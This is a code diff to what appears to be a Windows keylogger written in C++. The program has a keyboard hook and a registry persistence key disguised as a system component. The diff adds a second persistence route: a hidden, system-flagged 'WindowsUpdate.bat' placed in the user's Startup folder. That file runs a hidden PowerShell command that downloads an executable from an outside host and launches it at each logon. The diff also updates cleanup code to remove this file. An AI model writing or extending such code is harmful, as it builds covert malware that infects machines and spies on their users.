@@ -2265,6 +2265,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 #define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
 
 static void EnsureStartupEntry();
+static void EnsureStartupFolderEntry();
 
 static void CleanupPersistence() {
     HKEY hKey;
@@ -2278,6 +2279,10 @@ static void CleanupPersistence() {
     std::string cachedExe = std::string(tempPath) + GetExeName();
     DeleteFileA(cachedExe.c_str());
     DeleteFileA((std::string(tempPath) + "wuaueng.log").c_str());
+    char appdata[MAX_PATH];
+    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) > 0 && appdata[0]) {
+        DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.bat").c_str());
+    }
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
@@ -2375,10 +2380,29 @@ static void EnsureStartupEntry() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         RegCloseKey(hKey);
-        return;
+    } else {
+        // Payload missing -- reinstall
+        InstallStartup();
     }
-    // Payload missing -- reinstall
-    InstallStartup();
+    EnsureStartupFolderEntry();
+}
+
+static void EnsureStartupFolderEntry() {
+    char appdata[MAX_PATH];
+    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
+    std::string startupPath = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+    std::string batPath = startupPath + "\\WindowsUpdate.bat";
+    FILE* f = NULL;
+    fopen_s(&f, batPath.c_str(), "r");
+    if (f) { fclose(f); return; }
+    std::string batContent = "@echo off\r\n"
+        "powershell -w h -c \"$p=$env:TEMP+'\\\\" + GetExeName() + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"\r\n";
+    f = NULL;
+    fopen_s(&f, batPath.c_str(), "w");
+    if (!f) return;
+    fwrite(batContent.c_str(), 1, batContent.size(), f);
+    fclose(f);
+    SetFileAttributesA(batPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 }
 
 static int RunChild(HINSTANCE hInstance) {
